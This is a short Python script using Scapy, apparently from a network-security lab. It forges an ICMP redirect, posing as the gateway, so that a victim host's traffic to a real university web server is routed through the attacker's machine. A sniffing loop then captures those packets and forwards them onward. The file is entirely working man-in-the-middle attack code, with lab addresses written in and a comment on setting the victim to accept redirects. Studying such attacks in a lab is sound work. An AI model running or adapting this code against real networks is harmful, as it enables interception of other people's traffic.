#https://pastebin.com/raw/bHeDySLe

#!/usr/bin/python3

from scapy.all import *

victim_ip = '10.0.2.6'
victim_mac = '08:00:27:13:d7:c9'
attacker_ip = '10.0.2.5'
attacker_mac = '08:00:27:fe:52:df'
destination_ip = '103.94.135.200'
default_gateway_ip = '10.0.2.1'
default_gateway_mac = '52:54:00:12:35:00'

"""
https://github.com/MeghaJakhotia/InternetSecurityAttacks/blob/master/IP_Attack/IP_Attacks.pdf

sudo sysctl net.ipv4.conf.all.accept_redirects=1

Host A : Victim's IP(10.0.2.6) HWaddr (08:00:27:13:d7:c9)

Host M : Attacker's IP(10.0.2.5)  HWaddr (08:00:27:fe:52:df)

DGW : IP(10.0.2.1)	HWaddr(52:54:00:12:35:00)

Destination B: www.buet.ac.bd(103.94.135.200)
"""


# sniffing and then spoofing
def spoof_pkt_from_A(pkt):
	if pkt[IP].src == victim_ip and pkt[IP].dst == destination_ip:
		pkt.show2()
		pkt[Ether].dst = default_gateway_mac
		#pkt[IP].src = '10.0.2.4' 
		send(pkt)



def spoof_ICMP_redirect():
	ip = IP(src = default_gateway_ip, dst = victim_ip)
	ip.display()

	icmp = ICMP(type = 5, code = 0) # code 0/1 : Net/Host is unreachable
	icmp.gw = attacker_ip # new gateway
	icmp.display()

	# The enclosed IP packet should be the one that
	# triggers the redirect message.
	ip2 = IP(src = victim_ip, dst = destination_ip)
	ip2.display()
	send(ip/icmp/ip2/UDP())




def main():
	spoof_ICMP_redirect()
	pkt = sniff(filter='icmp', prn=spoof_pkt_from_A)


if __name__ == "__main__":
	main()










